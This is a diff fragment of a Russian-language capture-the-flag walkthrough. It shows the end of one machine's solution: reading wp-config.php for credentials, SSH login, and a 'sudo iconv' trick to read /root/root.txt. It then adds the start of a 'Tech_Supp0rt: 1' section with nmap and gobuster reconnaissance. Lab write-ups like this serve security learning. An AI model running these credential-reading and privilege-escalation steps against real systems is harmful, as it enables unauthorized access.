@@ -100,5 +100,13 @@ cat /var/www/html/wordpress/wp-config.php
 ssh scamsite@HOST_IP
 sudo -l
 sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
+```
 
+## 3. Tech_Supp0rt: 1
+Идея - 
+```bash
+nmap -sC -sV -oN MACHINE_IP
+
+# На порту 80 видим задорный сайтик с надписью battery и все, ищем скрытые директории
+gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt 
 ```
